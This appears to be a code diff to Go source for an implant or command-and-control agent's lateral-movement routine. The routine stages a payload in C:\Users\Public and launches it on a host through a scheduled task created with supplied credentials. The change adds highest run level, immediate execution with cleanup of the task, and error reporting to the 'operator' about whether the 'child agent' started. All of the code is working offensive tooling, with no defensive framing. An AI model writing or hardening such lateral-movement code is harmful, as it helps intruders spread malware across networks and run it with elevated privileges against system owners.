@@ -583,12 +583,15 @@ func lateralRunAs(host string, data []byte, existingPath, svcName, user, pass st
 		base := filepath.Base(existingPath)
 		pubPath := `C:\Users\Public\` + base
 		if !strings.EqualFold(existingPath, pubPath) {
-			if err := copyFile(existingPath, pubPath); err == nil {
-				localPath = pubPath
+			if err := copyFile(existingPath, pubPath); err != nil {
+				return "", fmt.Errorf("runas: copy payload to Public: %w", err)
 			}
-		}
-		if localPath == "" {
+			localPath = pubPath
+		} else {
 			localPath = existingPath
+		}
+		if _, err := os.Stat(localPath); err != nil {
+			return "", fmt.Errorf("runas: staged payload is not readable: %w", err)
 		}
 	} else {
 		// Stage payload directly (no SMB loopback issue)
@@ -632,15 +635,21 @@ func lateralRunAs(host string, data []byte, existingPath, svcName, user, pass st
 		"/RU", ruAccount, "/RP", pass,
 		"/TR", localPath,
 		"/TN", taskName,
-		"/SC", "ONCE", "/ST", "00:00",
+		"/SC", "ONCE", "/ST", "00:00", "/RL", "HIGHEST",
 		"/F",
 	).CombinedOutput()
 	if err != nil {
 		return "", fmt.Errorf("runas: schtasks /create: %w\n%s", err, strings.TrimSpace(string(out)))
 	}
 
-	// Run immediately (ignore output — task may already be running)
-	exec.Command("schtasks", "/run", "/TN", taskName).Run()
+	// Run immediately and propagate a scheduler failure.  Returning success
+	// after a rejected /run leaves the operator believing the child agent was
+	// started when only the task definition exists.
+	runOut, runErr := exec.Command("schtasks", "/run", "/TN", taskName).CombinedOutput()
+	if runErr != nil {
+		exec.Command("schtasks", "/delete", "/TN", taskName, "/F").Run()
+		return "", fmt.Errorf("runas: schtasks /run: %w\n%s", runErr, strings.TrimSpace(string(runOut)))
+	}
 
 	// Delete after the process has had time to start
 	go func() {
